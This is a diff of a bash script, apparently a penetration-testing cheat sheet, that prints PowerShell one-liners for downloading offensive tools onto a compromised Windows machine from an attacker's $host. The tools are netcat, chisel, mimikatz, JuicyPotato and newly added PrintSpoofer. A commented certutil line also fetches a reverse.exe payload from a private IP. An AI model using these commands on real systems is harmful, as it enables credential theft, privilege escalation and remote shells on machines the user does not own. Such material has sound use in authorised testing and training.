@@ -53,7 +53,7 @@ echo -e ""
 echo -e "${Frame}###${End} ${Title}Windows Binaries${End} ${Frame}###${End}"
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/wget.exe','C:\\\Users\\\Public\\\Documents\\\wget.exe')"
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/nc.exe','C:\\\Users\\\Public\\\Documents\\\nc.exe')"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/nc.exe','C:\\\Users\\\Public\\\Documents\\\nc64.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/nc64.exe','C:\\\Users\\\Public\\\Documents\\\nc64.exe')"
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/whoami.exe','C:\\\Users\\\Public\\\Documents\\\whoami.exe')"
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/accesschk.exe','C:\\\Users\\\Public\\\Documents\\\accesschk.exe')"
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/chisel_windows_amd64.exe','C:\\\Users\\\Public\\\Documents\\\chisel_windows_amd64.exe')"
@@ -62,6 +62,8 @@ echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('htt
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/mimikatz64.exe','C:\\\Users\\\Public\\\Documents\\\mimikatz64.exe')"
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/JuicyPotato32.exe','C:\\\Users\\\Public\\\Documents\\\JuicyPotato32.exe')"
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/JuicyPotato64.exe','C:\\\Users\\\Public\\\Documents\\\JuicyPotato64.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/PrintSpoofer32.exe','C:\\\Users\\\Public\\\Documents\\\PrintSpoofer32.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/PrintSpoofer64.exe','C:\\\Users\\\Public\\\Documents\\\PrintSpoofer64.exe')"
 echo -e ""
 
 # certutil -urlcache -f http://192.168.49.201:443/reverse.exe reverse.exe
